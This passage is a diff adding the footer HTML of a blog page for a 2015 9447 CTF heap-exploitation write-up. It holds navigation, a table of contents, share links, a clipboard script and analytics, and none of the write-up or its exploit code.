+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin%E6%B3%84%E9%9C%B2libc"><span class="toc-number">1.</span> <span class="toc-text">unsorted bin泄露libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8"><span class="toc-number">2.</span> <span class="toc-text">fastbin循环链表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E8%8A%82%E9%94%99%E4%BD%8D-Arbitrary-Alloc-and-malloc-hook"><span class="toc-number">3.</span> <span class="toc-text">字节错位 Arbitrary Alloc and malloc hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">4.</span> <span class="toc-text">EXP</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&text=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&is_video=false&description=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Arbitrary Alloc 2015 9447 CTF:Search Engine&body=Check out this article: https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&title=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&name=Arbitrary Alloc 2015 9447 CTF:Search Engine&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/03/19/2015-9447-CTF-Search-Engine/&t=Arbitrary Alloc 2015 9447 CTF:Search Engine"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    bxz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
